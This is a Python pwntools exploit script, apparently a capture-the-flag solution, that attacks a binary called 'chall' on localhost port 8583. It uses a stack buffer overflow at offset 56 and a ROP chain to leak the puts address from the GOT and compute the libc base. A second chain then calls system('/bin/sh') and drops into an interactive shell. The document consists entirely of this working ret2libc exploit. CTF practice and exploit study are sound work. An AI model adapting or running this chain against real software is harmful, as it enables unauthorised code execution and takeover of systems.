from pwn import *

# context.log_level = 'debug' #only you need to debug :>
elf = context.binary = ELF('./chall')
#p = process()
p = remote('localhost', 8583)
libc = ELF('./libc.so.6')
#libc = elf.libc
rop = ROP(elf)

rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
#main_addr = elf.sym['main'] # not using this one cuz binary is strip. 
main_addr = p64(0x401353)

offset = 56

payload = flat(
    'A' * 56,
    rdi, elf.got['puts'], 
    ret, elf.plt['puts'], 
    main_addr
)
p.sendlineafter('enter?:', '2147483647')
p.sendlineafter('raw bytes now: ', payload)

leak_raw = p.recvn(6)
log.info(f"Raw leak bytes: {leak_raw.hex()}")
leak = leak_raw.ljust(8, b'\x00')
leaked_puts = u64(leak)
log.info(f"Leaked puts address: {hex(leaked_puts)}")
libc.address = leaked_puts - libc.sym['puts']
log.info(f"libc base: {hex(libc.address)}")

system_addr = libc.sym['system']
binsh_addr = next(libc.search("/bin/sh\x00"))

payload2 = flat(
    'A'*56,
    rdi, # actually already stack alignment in here, so go using rdi instead directly
    binsh_addr, 
    system_addr
)
p.sendlineafter('enter?:', '2147483647')
p.sendlineafter('now: ', payload2)

p.interactive()
